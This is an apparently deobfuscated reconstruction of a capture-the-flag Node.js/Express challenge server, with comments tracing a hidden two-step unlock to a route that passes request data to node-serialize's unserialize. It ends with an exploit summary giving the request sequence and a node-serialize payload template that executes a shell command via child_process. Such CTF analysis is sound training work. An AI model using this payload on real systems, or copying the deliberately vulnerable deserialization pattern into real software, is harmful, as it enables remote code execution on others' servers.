// Full deobfuscated server reconstruction
// Lookup table (with rotation=15):
// 0x74 => /vuqsqsqdsddqsdl1221n
// 0x77 => /vuqsqsqdsdqsddqsdln
// 0x78 => /vuqsqsq11212dsddqsdln
// 0x79 => Hello World!
// 0x7a => mi12n
// 0x7c => admin
// 0x7e => listen
// 0x80 => Welcome admin
// 0x81 => /vuqsqsqdsddqsdln
// 0x82 => data
// 0x84 => /vuqsdqsdln
// 0x85 => Server is running on port 
// 0x86 => /vul18ddqsdln126
// 0x87 => /vuqsq1212qsqdsddqsdln
// 0x88 => node-serialize
// 0x8a => unserialize
// 0x8b => urlencoded
// 0x8c => ad1
// 0x8d => /vuqs1244qsqdsddqsdln
// 0x8e => x-powered-by
// 0x8f => Welcome guest
// 0x91 => /vuln
// 0x95 => send
// 0x96 => /vuqsqsddqsdln123
// 0x97 => body
// 0x98 => log
// 0x99 => use
// 0x9a => disable
// 0x9b => get
// 0x9c => post
// 0x9d => /vuqsqsqdsddqsd2189ln

const serialize = require('node-serialize');
const express = require('express');
const app = express();
const PORT = Number(process.env.PORT) || 0x1080; // 4224

app.disable('x-powered-by');
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let aa = {}, a = {};

function check(x) {
    return x == 'admin' ? 'Welcome admin' : 'Welcome guest';
}

// GET /
app.get('/', (req, res) => {
    return res.send('Hello World!');
});

// POST /vuqsqsqdsddqsdl1221n
// Condition: 0x1 == a['ia']  => false always (a.ia never set to 1)
// Second condition: 0x1 < 0x1 => false always  
// => always responds 'ok'
app.post('/vuqsqsqdsddqsdl1221n', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);          // dead (a.ia never set)
    if (1 < 1) result = serialize(data);            // dead
    return res.send(result || 'ok');
});

// POST /vuln
// Condition: 0x1 == 0x2 => false always
// Second: 0x1 < 0x1 => false always
// => always responds 'send'
app.post('/vuln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == 2) result = serialize.unserialize(data);  // dead
    if (1 < 1) result = eval(data);                    // dead
    return res.send(result);  // sends undefined => ''
});

// POST /vuqsdqsdln
// Condition: 0x1 == 0x8 => false always
// => always responds 'ok'
app.post('/vuqsdqsdln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == 8) result = eval(data);                  // dead
    if (1 < 1) result = serialize(data);              // dead
    return res.send(result || 'ok');
});

// POST /vuqsqsddqsdln123  *** STEP 1 of unlock ***
// If data == 'ad1' + 'mi12n' == 'ad1mi12n' then a['aa'] = 'ad1mi12n'
// Also: if 1==a (object) => false; if 1<1 => false
app.post('/vuqsqsddqsdln123', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a) result = eval(data);                  // dead (1 != object)
    if (data == 'ad1' + 'mi12n') {                    // data == 'ad1mi12n'
        a['aa'] = 'ad1' + 'mi12n';                   // a.aa = 'ad1mi12n'
    }                                                  // NOT 'ad1'+'ad1'+'mi12n'!
    if (1 < 1) result = serialize(data);              // dead
    return res.send(result || 'ok');
});

// POST /vuqsqsqdsddqsd2189ln
// Condition: 0x1 == a['ia'] => dead
app.post('/vuqsqsqdsddqsd2189ln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);            // dead
    if (1 < 1) result = serialize(data);              // dead
    return res.send(result || 'ok');
});

// POST /vuqs1244qsqdsddqsdln (via app.post with 0x8d)
// Condition: a.ia => dead
app.post('/vuqs1244qsqdsddqsdln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);            // dead
    if (1 < 1) result = serialize(data);              // dead
    return res.send(result || 'ok');
});

// POST /vuqsqsqdsddqsdln
// Condition: dead
app.post('/vuqsqsqdsddqsdln', (req, res) => {
    let result = '';
    let body_data = req.body['data'];
    if (1 == a['ia']) result = eval(body_data);       // dead
    if (1 < 1) result = serialize(body_data);         // dead
    return res.send(result || 'ok');
});

// POST /vul18ddqsdln126  *** THE VULNERABLE ROUTE ***
// Condition: a['za'] == 'a12b' (must be set first!)
// serialize.unserialize(data) => NODE-SERIALIZE RCE!
app.post('/vul18ddqsdln126', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (a['za'] == 'a' + '12' + 'b') {              // a.za == 'a12b'
        result = serialize.unserialize(data);          // *** RCE HERE ***
    }
    return res.send(result || 'ok');
});

// POST /vuqsq1212qsqdsddqsdln
// Condition: dead
app.post('/vuqsq1212qsqdsddqsdln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);            // dead
    if (1 < 1) result = serialize(data);              // dead
    return res.send(result || 'ok');
});

// POST /vuqsqsq11212dsddqsdln
// if a['ia'] == 'ai12n' => serialize.unserialize(data)  -- but a.ia never set!
app.post('/vuqsqsq11212dsddqsdln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);            // dead
    if (a['ia'] == 'ai12n') result = serialize.unserialize(data); // dead
    return res.send(result || 'ok');
});

// POST /vuqsqsqdsdqsddqsdln
// dead
app.post('/vuqsqsqdsdqsddqsdln', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);            // dead
    if (1 < 1) result = serialize(data);              // dead
    return res.send(result || 'ok');
});

// Fake GET /vuqsqsddqsdln123  (via 0x9b = get, 0x9c... wait)
// Actually: app[_0x1d7bcf(0x9c)](_0x1d7bcf(0x78),...) = app.post('/vuqsqsq11212dsddqsdln',...)
// app['post'](_0x1d7bcf(0x87),...) = app.post('/vuqsq1212qsqdsddqsdln',...)
// BUT WAIT: There's also this route in the middle:
// app[_0x1d7bcf(0x9c)]('/vuqsqsqdsddqsdln1', ...)  -- hardcoded string 'vuqsqsqdsddqsdln1'

// POST /vuqsqsqdsddqsdln1  *** STEP 2 of unlock ***
// if data == 'b'+'a'+'12' == 'ba12'
// AND a['aa'] == 'ad'+'1'+'mi12n' == 'ad1mi12n'
// THEN a['za'] = 'a'+'12'+'b' = 'a12b' => UNLOCKS /vul18ddqsdln126!
app.post('/vuqsqsqdsddqsdln1', (req, res) => {
    let result = '';
    let data = req.body['data'];
    if (1 == a['ia']) result = eval(data);            // dead
    
    if (data == 'b' + 'a' + '12') {                  // data == 'ba12'
        if (a['aa'] == 'ad' + '1' + 'mi12n') {       // a.aa == 'ad1mi12n' (set by step 1)
            // Wait: in code it's: a['aa']=='ad'+'1'+_0x557af8(0x7a) 
            // 0x7a with rotation 15 = 'mi12n' => a.aa == 'ad1mi12n' ✓
            a['za'] = 'a' + '12' + 'b';              // a.za = 'a12b' => unlocks RCE!
        }
    }
    
    return res.send(result || 'ok');
});

app.listen(PORT, () => {
    console.log('Server is running on port ' + PORT);
});

// ======================================================================
// EXPLOIT SUMMARY:
// ======================================================================
// 
// Step 1: POST /vuqsqsddqsdln123 with data=ad1mi12n
//         => sets a.aa = 'ad1mi12n'
//
// Step 2: POST /vuqsqsqdsddqsdln1 with data=ba12
//         => checks a.aa=='ad1mi12n', then sets a.za='a12b'
//
// Step 3: POST /vul18ddqsdln126 with data=<node-serialize RCE payload>
//         => a.za=='a12b' is satisfied => serialize.unserialize(data) is called
//         => RCE via node-serialize deserialization vulnerability
//
// Node-serialize RCE payload format:
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('CMD',function(e,s,t){});return 1;}()"}
// 
// Target: obfusca-not-thor.hackday.fr:4224
